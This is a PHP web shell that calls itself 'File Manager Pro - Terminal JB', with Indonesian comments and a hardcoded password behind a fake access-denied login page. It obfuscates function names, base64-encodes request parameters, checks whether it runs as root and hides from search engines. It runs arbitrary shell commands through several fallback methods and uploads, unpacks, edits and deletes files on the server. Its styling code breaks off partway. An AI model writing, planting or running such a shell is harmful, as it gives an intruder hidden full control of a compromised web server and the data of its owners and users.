<?php
// ============================================
// FILE MANAGER PRO - CORE PHP FUNCTIONS
// ============================================

$password = "sumala168"; // Change this password
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit", -1);
$sessioncode = md5(__FILE__);

// Authentication
if (!empty($password) and $_SESSION[$sessioncode] != $password) {
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    } else {
        showLoginPage();
        exit;
    }
}

// ============================================
// SYSTEM CONFIGURATION
// ============================================

// Define core functions with string obfuscation
$chd = "c" . "h" . "d" . "i" . "r";
$expl = "e" . "x" . "p" . "l" . "o" . "d" . "e";
$scd = "s" . "c" . "a" . "n" . "d" . "i" . "r";
$ril = "r" . "e" . "a" . "l" . "p" . "a" . "t" . "h";
$st = "s" . "t" . "a" . "t";
$isdir = "i" . "s" . "_" . "d" . "i" . "r";
$isw = "i" . "s" . "_" . "w" . "r" . "i" . "t" . "a" . "b" . "l" . "e";
$mup = "m" . "o" . "v" . "e" . "_" . "u" . "p" . "l" . "o" . "a" . "d" . "e" . "d" . "_" . "f" . "i" . "l" . "e";
$bs = "b" . "a" . "s" . "e" . "n" . "a" . "m" . "e";
$htm = "h" . "t" . "m" . "l" . "s" . "p" . "e" . "c" . "i" . "a" . "l" . "c" . "h" . "a" . "r" . "s";
$fpc = "f" . "i" . "l" . "e" . "_" . "p" . "u" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
$mek = "m" . "k" . "d" . "i" . "r";
$fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
$drnmm = "d" . "i" . "r" . "n" . "a" . "m" . "e";
$unl = "u" . "n" . "l" . "i" . "n" . "k";

// Helper functions
function x($b) {
    $be = "ba" . "se" . "64" . "_" . "en" . "co" . "de";
    return $be($b);
}

function y($b) {
    $bd = "ba" . "se" . "64" . "_" . "de" . "co" . "de";
    return $bd($b);
}

// Initialize system
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = $ril($_SERVER[hex2bin('444F43554D454E545F524F4F54')]);
$scriptDirectory = $drnmm(__FILE__);

// Decode GET parameters
foreach ($_GET as $c => $d) $_GET[$c] = y($d);

// Set current directory
$currentDirectory = $ril(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
$chd($currentDirectory);

// Check if running as root
$isRoot = (function_exists('posix_getuid') && posix_getuid() === 0) || 
          (strpos(php_uname(), 'root') !== false) || 
          (function_exists('shell_exec') && trim(shell_exec('whoami')) === 'root');

// ============================================
// ZIP EXTRACTION FUNCTION - LANGSUNG JADI FILE PHP
// ============================================

function extractZipToCurrent($zipFile) {
    $zip = new ZipArchive();
    $extractCount = 0;
    $phpCount = 0;
    $errors = [];
    $extractedFiles = [];
    
    if ($zip->open($zipFile) === TRUE) {
        // Extract all files langsung ke current directory
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $filename = $zip->getNameIndex($i);
            $fileinfo = pathinfo($filename);
            
            // Skip directories
            if (substr($filename, -1) == '/') continue;
            
            // Get just the filename without path
            $basename = basename($filename);
            
            // Extract the file langsung ke current directory
            if ($zip->extractTo('./', $filename)) {
                // If file was extracted with path, move it to current directory
                if ($filename != $basename) {
                    $extractedWithPath = './' . $filename;
                    $newLocation = './' . $basename;
                    if (file_exists($extractedWithPath)) {
                        rename($extractedWithPath, $newLocation);
                        // Clean up empty directories
                        $dirToRemove = dirname('./' . $filename);
                        while ($dirToRemove != '.' && is_dir($dirToRemove)) {
                            rmdir($dirToRemove);
                            $dirToRemove = dirname($dirToRemove);
                        }
                    }
                } else {
                    $newLocation = './' . $basename;
                }
                
                $extractCount++;
                $extractedFiles[] = $basename;
                
                // If it's a PHP file, set proper permissions
                if (isset($fileinfo['extension']) && strtolower($fileinfo['extension']) == 'php') {
                    @chmod('./' . $basename, 0755);
                    $phpCount++;
                } else {
                    @chmod('./' . $basename, 0644);
                }
            } else {
                $errors[] = "Failed to extract: " . $filename;
            }
        }
        
        $zip->close();
        
        return [
            'success' => true, 
            'count' => $extractCount, 
            'php_count' => $phpCount,
            'files' => $extractedFiles,
            'errors' => $errors
        ];
    } else {
        return ['success' => false, 'error' => 'Failed to open ZIP file'];
    }
}

// ============================================
// TERMINAL JB FUNCTION - IMPROVED COMMAND EXECUTION
// ============================================

function executeTerminalJB($command) {
    $output = '';
    $error = '';
    
    // Cek berbagai metode eksekusi command
    if (function_exists('shell_exec')) {
        // Method 1: shell_exec
        $result = shell_exec($command . ' 2>&1');
        if ($result !== null) {
            $output = $result;
        }
    } 
    elseif (function_exists('exec')) {
        // Method 2: exec
        exec($command . ' 2>&1', $outputArray, $returnCode);
        $output = implode("\n", $outputArray);
    } 
    elseif (function_exists('system')) {
        // Method 3: system with output buffering
        ob_start();
        system($command . ' 2>&1', $returnCode);
        $output = ob_get_clean();
    } 
    elseif (function_exists('passthru')) {
        // Method 4: passthru with output buffering
        ob_start();
        passthru($command . ' 2>&1', $returnCode);
        $output = ob_get_clean();
    } 
    elseif (function_exists('proc_open')) {
        // Method 5: proc_open (paling reliable)
        $descriptorspec = [
            0 => ['pipe', 'r'],  // stdin
            1 => ['pipe', 'w'],  // stdout
            2 => ['pipe', 'w']   // stderr
        ];
        
        $process = proc_open($command, $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            // Close stdin
            fclose($pipes[0]);
            
            // Get output
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            
            // Close pipes
            fclose($pipes[1]);
            fclose($pipes[2]);
            
            // Get return code
            $returnCode = proc_close($process);
            
            $output = $stdout;
            if (!empty($stderr)) {
                $error = $stderr;
            }
        }
    } 
    elseif (function_exists('popen')) {
        // Method 6: popen
        $handle = popen($command . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
        }
    }
    
    // Jika output kosong tapi ada error, tampilkan error
    if (empty(trim($output)) && !empty($error)) {
        $output = $error;
    }
    
    // Jika masih kosong, beri pesan
    if (empty(trim($output))) {
        $output = "Command executed but no output returned.\n";
        if ($command == 'ls' || $command == 'dir') {
            $output = "Directory listing:\n";
            $files = scandir(getcwd());
            foreach ($files as $file) {
                if ($file != '.' && $file != '..') {
                    $output .= $file . "\n";
                }
            }
        }
    }
    
    return $output;
}

// ============================================
// REQUEST HANDLER
// ============================================

$viewCommandResult = '';
$alertMessages = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // FILE UPLOAD HANDLER
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . $bs($_FILES["fileToUpload"]["name"]);
        if ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            $alertMessages[] = ['type' => 'success', 'message' => 'File ' . $htm($bs($_FILES["fileToUpload"]["name"])) . ' uploaded successfully!'];
        } else {
            $alertMessages[] = ['type' => 'error', 'message' => 'Sorry, there was an error uploading your file.'];
        }
    }
    
    // ZIP UPLOAD & EXTRACT HANDLER - LANGSUNG JADI FILE PHP
    elseif (isset($_FILES['zipToUpload'])) {
        $zipFile = $_FILES['zipToUpload']['tmp_name'];
        $zipName = $bs($_FILES["zipToUpload"]["name"]);
        $zipExt = strtolower(pathinfo($zipName, PATHINFO_EXTENSION));
        
        // Check if it's a valid ZIP file
        if ($zipExt != 'zip') {
            $alertMessages[] = ['type' => 'error', 'message' => 'Error: File must be a ZIP archive!'];
        } else {
            // Extract langsung ke current directory
            $result = extractZipToCurrent($zipFile);
            
            if ($result['success']) {
                $message = "✅ ZIP extracted successfully! " . $result['count'] . " files extracted to current directory.";
                
                if ($result['php_count'] > 0) {
                    $message .= "<br>🐘 PHP files detected and activated: <strong>" . $result['php_count'] . "</strong>";
                    $message .= "<br>📄 Files: " . implode(", ", array_slice($result['files'], 0, 5));
                    if (count($result['files']) > 5) {
                        $message .= " and " . (count($result['files']) - 5) . " more...";
                    }
                }
                
                if (!empty($result['errors'])) {
                    $message .= "<br>⚠️ Warnings: " . implode(", ", $result['errors']);
                }
                
                $alertMessages[] = ['type' => 'success', 'message' => $message];
                
                // Refresh the page to show new files
                echo '<meta http-equiv="refresh" content="1">';
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Error: ' . $result['error']];
            }
        }
    }
    
    // CREATE FOLDER HANDLER
    elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $ff = $_POST['folder_name'];
        $newFolder = $currentDirectory . '/' . $ff;
        if (!file_exists($newFolder)) {
            if ($mek($newFolder) !== false) {
                $alertMessages[] = ['type' => 'success', 'message' => 'Folder created successfully: ' . $ff];
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Error: Failed to create folder!'];
            }
        } else {
            $alertMessages[] = ['type' => 'error', 'message' => 'Error: Folder already exists!'];
        }
    }
    
    // CREATE FILE HANDLER
    elseif (isset($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if ($fpc($newFile, '') !== false) {
                $alertMessages[] = ['type' => 'success', 'message' => 'File created successfully: ' . $fileName];
                $fileToView = $newFile;
                if (file_exists($fileToView)) {
                    $fileContent = $fgc($fileToView);
                    $viewCommandResult = generateEditForm($fileName, $fileContent);
                }
            } else {
                $alertMessages[] = ['type' => 'error', 'message' => 'Error: Failed to create file!'];
            }
        } else {
            $alertMessages[] = ['type' => 'error', 'message' => 'Error: File already exists!'];
        }
    }
    
    // DELETE HANDLER
    elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        $result = handleDelete($fileToDelete, $_POST['delete_file']);
        $alertMessages[] = $result;
    }
    
    // RENAME HANDLER
    elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name']) && !empty($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        $result = handleRename($oldName, $newName, $_POST['old_name']);
        $alertMessages[] = $result;
    }
    
    // TERMINAL JB HANDLER (dulu Standard Command)
    elseif (isset($_POST['terminal_jb_cmd'])) {
        $command = $_POST['terminal_jb_cmd'];
        $output = executeTerminalJB($command);
        $viewCommandResult = generateTerminalJBOutput($command, $output);
    }
    
    // VIEW FILE HANDLER
    elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = $fgc($fileToView);
            $viewCommandResult = generateEditForm($_POST['view_file'], $fileContent);
        } else {
            $alertMessages[] = ['type' => 'error', 'message' => 'Error: File not found!'];
        }
    }
    
    // EDIT FILE HANDLER
    elseif (isset($_POST['edit_file'])) {
        $ef = $currentDirectory . '/' . $_POST['edit_file'];
        $newContent = $_POST['content'];
        if ($fpc($ef, $newContent) !== false) {
            $alertMessages[] = ['type' => 'success', 'message' => 'File edited successfully: ' . $_POST['edit_file']];
        } else {
            $alertMessages[] = ['type' => 'error', 'message' => 'Error: Failed to edit file!'];
        }
    }
}

// ============================================
// HELPER FUNCTIONS
// ============================================

function showLoginPage() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Authentication Required</title>
        <meta charset='UTF-8'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: #000000;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .login-container {
                background: #111111;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 15px 35px rgba(255,255,255,0.1);
                width: 100%;
                max-width: 400px;
                animation: slideUp 0.5s ease;
                border: 1px solid #333333;
            }
            @keyframes slideUp {
                from { opacity: 0; transform: translateY(20px); }
                to { opacity: 1; transform: translateY(0); }
            }
            h1 { color: #ffffff; margin-bottom: 10px; font-size: 24px; text-align: center; }
            .error-message {
                background: #330000;
                color: #ff6666;
                padding: 12px;
                border-radius: 5px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid #660000;
            }
            .info-message {
                background: #1a3300;
                color: #99ff99;
                padding: 12px;
                border-radius: 5px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid #336600;
            }
            form { margin-top: 20px; }
            input[type='password'] {
                width: 100%; padding: 12px; margin-bottom: 15px;
                border: 2px solid #333333;
                background: #222222;
                color: #ffffff;
                border-radius: 5px; font-size: 16px;
                transition: border-color 0.3s;
            }
            input[type='password']:focus {
                outline: none; border-color: #666666;
            }
            input[type='submit'] {
                width: 100%; padding: 12px;
                background: #333333;
                color: white; border: none; border-radius: 5px; font-size: 16px;
                font-weight: 600; cursor: pointer; transition: all 0.2s;
            }
            input[type='submit']:hover {
                background: #444444;
                box-shadow: 0 5px 15px rgba(255,255,255,0.1);
            }
            .server-info {
                margin-top: 20px; padding-top: 20px;
                border-top: 1px solid #333333; text-align: center;
                color: #999999; font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class='login-container'>
            <h1>🔒 Access Restricted</h1>
            <div class='error-message'>You don't have permission to access this page</div>
            <div class='info-message'>Please enter the password to continue</div>
            <form method='post'>
                <input type='password' name='pass' placeholder='Enter password' required>
                <input type='submit' value='Authenticate'>
            </form>
            <div class='server-info'>
                <strong>Server:</strong> <?php echo $_SERVER["HTTP_HOST"]; ?><br>
                <strong>Port:</strong> 80
            </div>
        </div>
    </body>
    </html>
    <?php
}

function generateEditForm($fileName, $fileContent) {
    $htm = "h" . "t" . "m" . "l" . "s" . "p" . "e" . "c" . "i" . "a" . "l" . "c" . "h" . "a" . "r" . "s";
    return '<div class="result-box-container">
        <div class="card">
            <div class="card-header">
                <i class="fas fa-file-code"></i> Editing: ' . $fileName . '
            </div>
            <div class="card-body">
                <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">
                    <textarea name="content" class="code-editor">' . $htm($fileContent) . '</textarea>
                    <input type="hidden" name="edit_file" value="' . $fileName . '">
                    <button type="submit" class="btn btn-primary" style="margin-top: 15px;">
                        <i class="fas fa-save"></i> Save Changes
                    </button>
                </form>
            </div>
        </div>
    </div>';
}

function generateTerminalJBOutput($command, $output) {
    $htm = "h" . "t" . "m" . "l" . "s" . "p" . "e" . "c" . "i" . "a" . "l" . "c" . "h" . "a" . "r" . "s";
    
    // Get current directory
    $currentDir = getcwd();
    
    return '<div class="result-box-container">
        <div class="card">
            <div class="card-header" style="background: #222222; color: #00ff00;">
                <i class="fas fa-terminal"></i> Terminal JB - Command Output
            </div>
            <div class="card-body">
                <div style="background: #111111; padding: 10px; border-radius: 5px; margin-bottom: 15px; border-left: 4px solid #00ff00;">
                    <span style="color: #00ff00; font-weight: bold;">$</span> <span style="color: #ffffff;">' . $htm($command) . '</span>
                    <br>
                    <span style="color: #888888; font-size: 12px;">Directory: ' . $htm($currentDir) . '</span>
                </div>
                <pre class="command-output" style="background: #000000; color: #00ff00; padding: 20px; border-radius: 5px; max-height: 500px; overflow-y: auto;">' . $htm($output) . '</pre>
                <div style="margin-top: 15px; display: flex; gap: 10px;">
                    <button onclick="this.parentElement.parentElement.parentElement.parentElement.remove()" class="btn btn-primary" style="padding: 5px 15px;">
                        <i class="fas fa-times"></i> Close Output
                    </button>
                </div>
            </div>
        </div>
    </div>';
}

function handleDelete($path, $name) {
    $unl = "u" . "n" . "l" . "i" . "n" . "k";
    
    if (!file_exists($path)) {
        return ['type' => 'error', 'message' => 'Error: File or directory not found!'];
    }
    
    if (is_dir($path)) {
        if (deleteDirectory($path)) {
            return ['type' => 'success', 'message' => 'Folder deleted successfully: ' . $name];
        }
    } else {
        if ($unl($path)) {
            return ['type' => 'success', 'message' => 'File deleted successfully: ' . $name];
        }
    }
    return ['type' => 'error', 'message' => 'Error: Failed to delete!'];
}

function handleRename($old, $new, $oldName) {
    if (file_exists($old)) {
        if (rename($old, $new)) {
            return ['type' => 'success', 'message' => 'Item renamed successfully: ' . $oldName];
        }
    }
    return ['type' => 'error', 'message' => 'Error: Failed to rename item!'];
}

function deleteDirectory($dir) {
    $unl = "u" . "n" . "l" . "i" . "n" . "k";
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return $unl($dir);
    
    $scd = "s" . "c" . "a" . "n" . "d" . "i" . "r";
    foreach ($scd($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

// ============================================
// SORT ITEMS - FOLDERS FIRST, FILES AFTER
// ============================================

$allItems = $scd($currentDirectory);
$folders = [];
$files = [];

foreach ($allItems as $item) {
    if ($item == '.' || $item == '..') continue;
    
    $fullPath = $currentDirectory . '/' . $item;
    if (is_dir($fullPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

// Sort folders and files alphabetically
sort($folders, SORT_STRING);
sort($files, SORT_STRING);

// ============================================
// HTML OUTPUT STARTS HERE
// ============================================
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager Pro - Terminal JB</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* ============================================
           SIMPLE THEME - CSS VARIABLES
        ============================================ */
        :root {
            --bg-primary: #000000;
            --bg-secondary: #0a0a0a;
            --bg-tertiary: #111111;
            --bg-card: #1a1a1a;
            --bg-hover: #222222;
            
            --text-primary: #ffffff;
            --text-secondary: #cccccc;
            --text-muted: #999999;
            
            --border-color: #333333;
            --border-light: #222222;
            
            --accent-primary: #444444;
            --accent-secondary: #555555;
            --accent-success: #00cc66;
            --accent-danger: #ff4444;
            --accent-warning: #ffaa00;
            --accent-info: #3399ff;
            --accent-zip: #ffaa00;
            --accent-php: #787CB5;
            --accent-terminal: #00ff00;
            
            --folder-color: #ffaa00;
            --file-color: #3399ff;
            --php-color: #787CB5;
            --root-color: #ffaa00;
            --terminal-color: #00ff00;
            
            --shadow: 0 5px 20px rgba(0, 255, 0, 0.2);
            --radius: 10px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(rgba(0, 255, 0, 0.05), rgba(0, 0, 0, 0.9)), 
                        url('https://i.ibb.co/NnyHXG0d/1e7bcc618f7afe4c75529f510aa7209f.jpg') no-repeat center center fixed;
            background-size: cover;
            color: var(--text-primary);
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: var(--bg-secondary);
            border-radius: 20px;
            box-shadow: var(--shadow);
            overflow: hidden;
            animation: slideIn 0.5s ease;
            border: 1px solid var(--border-color);
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* ============================================
           HEADER SECTION
        ============================================ */
        .header {
            background: var(--bg-tertiary);
            color: var(--text-primary);
            padding: 30px;
            border-bottom: 1px solid var(--border-color);
        }

        .header h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .header h1 i { 
            font-size: 32px;
            color: var(--accent-terminal);
        }

        .terminal-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #003300;
            color: var(--accent-terminal);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            border: 1px solid #00ff00;
            margin-left: 15px;
        }

        .php-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #2c2b3a;
            color: var(--accent-php);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            border: 1px solid #5f5b7a;
            margin-left: 15px;
        }

        .root-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #332200;
            color: var(--root-color);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            border: 1px solid #665500;
            margin-left: 15px;
        }

        .system-info {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            padding-top: 15px;
            border-top: 1px solid var(--border-color);
        }

        .info-item {
            background: var(--bg-card);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            border: 1px solid var(--border-light);
            color: var(--text-secondary);
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 4px 10px;
            border-radius: 15px;
            font-size: 12px;
            font-weight: 600;
        }

        .status-on { 
            background: #003322; 
            color: #00ff99;
            border: 1px solid #006633;
        }
        
        .status-off { 
            background: #330000; 
            color: #ff6666;
            border: 1px solid #660000;
        }

        /* ============================================
           ALERT MESSAGES
        ============================================ */
        .alert {
            margin: 20px 30px;
            padding: 15px 20px;
            border-radius: var(--radius);
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideIn 0.3s ease;
            border-left: 4px solid;
        }

        .alert-success {
            background: #003322;
            color: #00ff99;
            border-left-color: #00ff99;
        }

        .alert-success a {
            color: #00ff99;
            text-decoration: underline;
        }

        .alert-danger {
            background: #330000;
            color: #ff6666;
            border-left-color: #ff4444;
        }

        .alert-info {
            background: #002233;
            color: #66ccff;
            border-left-color: #3399ff;
        }

        .alert-warning {
            background: #332200;
            color: #ffcc66;
            border-left-color: #ffaa00;
        }

        /* ============================================
           NAVIGATION & PATH
        ============================================ */
        .navigation {
            background: var(--bg-tertiary);
            padding: 20px 30px;
            border-bottom: 1px solid var(--border-color);
        }

        .path-navigation {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            background: var(--bg-card);
            padding: 12px 20px;
            border-radius: var(--radius);
            margin-bottom: 20px;
            border: 1px solid var(--border-light);
        }

        .path-navigation a {
            color: var(--text-secondary);
            text-decoration: none;
            font-weight: 500;
            padding: 5px 10px;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .path-navigation a:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }

        .home-link {
            background: var(--accent-terminal) !important;
            color: var(--bg-primary) !important;
            padding: 5px 15px !important;
            font-weight: 600 !important;
        }

        /* ============================================
           ACTION CARDS GRID
        ============================================ */
        .action-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .action-card {
            background: var(--bg-card);
            border-radius: var(--radius);
            padding: 20px;
            transition: all 0.3s;
            border: 1px solid var(--border-light);
        }

        .action-card:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow);
            border-color: var(--accent-secondary);
        }

        .action-card h3 {
            font-size: 16px;
            margin-bottom: 15px;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .action-card h3 i {
            color: var(--accent-success);
        }

        .zip-card {
            border-left: 4px solid var(--accent-zip);
        }

        .zip-card h3 i {
            color: var(--accent-zip);
        }

        .terminal-card {
            border-left: 4px solid var(--accent-terminal);
        }

        .terminal-card h3 i {
            color: var(--accent-terminal);
        }

        .action-card form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .action-card input[type="text"] {
            width: 100%;
            padding: 10px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-light);
            border-radius: 5px;
            font-size: 14px;
            color: var(--text-primary);
        }

        .action-card input[type="file"] {
            width: 100%;
            padding: 8px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-light);
            border-radius: 5px;
            color: var(--text-secondary);
        }

        .action-card .btn {
            width: 100%;
            justify-content: center;
        }

        .action-card small {
            color: var(--text-muted);
            font-size: 11px;
            text-align: center;
        }

        /* ============================================
           BUTTONS
        ============================================ */
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 14px;
        }

        .btn-primary { 
            background: var(--accent-primary); 
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }
        
        .btn-primary:hover { 
            background: var(--accent-secondary);
        }
        
        .btn-success { 
            background: #00aa55; 
            color: var(--bg-primary);
        }
        
        .btn-success:hover { background: #00cc66; }
        
        .btn-danger { 
            background: #cc3333; 
            color: var(--text-primary);
        }
        
        .btn-warning { 
            background: #cc8800; 
            color: var(--bg-primary);
        }

        .btn-zip {
            background: #cc8800;
            color: var(--bg-primary);
            font-weight: 700;
        }
        
        .btn-zip:hover { background: #ffaa00; }

        .btn-terminal {
            background: #00aa00;
            color: var(--bg-primary);
            font-weight: 700;
        }
        
        .btn-terminal:hover { background: #00ff00; }

        .btn-icon {
            padding: 8px 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            color: var(--text-primary);
            font-size: 14px;
        }

        .btn-view { background: #0066aa; }
        .btn-delete { background: #aa3333; }
        .btn-rename { background: #aa8800; }

        /* ============================================
           UPLOAD AREA
        ============================================ */
        .upload-area {
            background: var(--bg-tertiary);
            padding: 30px;
            margin: 0 30px 20px 30px;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
        }

        .upload-form {
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }

        .file-input {
            flex: 1;
            background: var(--bg-card);
            padding: 10px;
            border-radius: 5px;
            color: var(--text-secondary);
            border: 1px solid var(--border-light);
        }

        .file-input::-webkit-file-upload-button {
            background: var(--accent-primary);
            color: var(--text-primary);
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            font-weight: 600;
            cursor: pointer;
            margin-right: 10px;
            border: 1px solid var(--border-color);
        }

        /* ============================================
           CARDS & RESULT BOXES
        ============================================ */
        .card {
            background: var(--bg-tertiary);
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            margin: 20px 30px;
            overflow: hidden;
        }

        .card-header {
            background: var(--bg-card);
            padding: 15px 20px;
            font-weight: 600;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-primary);
        }

        .card-body { 
            padding: 20px;
            background: var(--bg-tertiary);
        }

        .code-editor {
            width: 100%;
            min-height: 200px;
            padding: 15px;
            background: var(--bg-primary);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            border-radius: 5px;
            border: 1px solid var(--border-color);
            resize: vertical;
        }

        .command-output, .error-output {
            background: var(--bg-primary);
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
            border: 1px solid var(--border-color);
        }

        .error-output { color: #ff6666; }

        /* ============================================
           SECTION HEADERS
        ============================================ */
        .section-header {
            margin: 30px 30px 15px 30px;
            padding: 10px 15px;
            background: var(--bg-card);
            border-radius: var(--radius);
            border-left: 4px solid;
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            font-size: 16px;
        }

        .folder-section {
            border-left-color: var(--folder-color);
        }

        .file-section {
            border-left-color: var(--file-color);
        }

        .section-count {
            margin-left: auto;
            background: var(--bg-tertiary);
            padding: 3px 10px;
            border-radius: 15px;
            font-size: 12px;
            color: var(--text-muted);
        }

        /* ============================================
           TABLE STYLES
        ============================================ */
        .table-container {
            margin: 0 30px 30px 30px;
            overflow-x: auto;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 800px;
        }

        th {
            background: var(--bg-card);
            color: var(--text-primary);
            font-weight: 600;
            font-size: 14px;
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }

        td {
            padding: 12px 15px;
            border-bottom: 1px solid var(--border-light);
            font-size: 14px;
            color: var(--text-secondary);
        }

        tr:hover { 
            background: var(--bg-hover);
        }

        .folder-row td:first-child i {
            color: var(--folder-color);
        }

        .file-row td:first-child i {
            color: var(--file-color);
        }

        .php-file td:first-child i {
            color: var(--php-color);
        }

        .root-row {
            background: rgba(255, 170, 0, 0.1);
        }

        .root-badge-small {
            display: inline-flex;
            align-items: center;
            gap: 3px;
            background: #332200;
            color: var(--root-color);
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
            margin-left: 8px;
            border: 1px solid #665500;
        }

        .php-badge-small {
            display: inline-flex;
            align-items: center;
            gap: 3px;
            background: #2c2b3a;
            color: var(--php-color);
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
            margin-left: 8px;
            border: 1px solid #5f5b7a;
        }

        .terminal-badge-small {
            display: inline-flex;
            align-items: center;
            gap: 3px;
            background: #003300;
            color: var(--terminal-color);
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
            margin-left: 8px;
            border: 1px solid #00ff00;
        }

        .item-name a {
            color: var(--text-secondary);
            text-decoration: none;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .item-name a:hover { 
            color: var(--accent-success);
        }

        .permission {
            font-family: 'Courier New', monospace;
            font-weight: 600;
        }

        .rename-form {
            display: flex;
            gap: 5px;
        }

        .rename-form input[type="text"] {
            width: 100px;
            padding: 5px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-light);
            border-radius: 3px;
            font-size: 12px;
            color: var(--text-primary);
        }

        .empty-state {
            text-align: center;
            padding: 40px;
            color: var(--text-muted);
        }

        .footer {
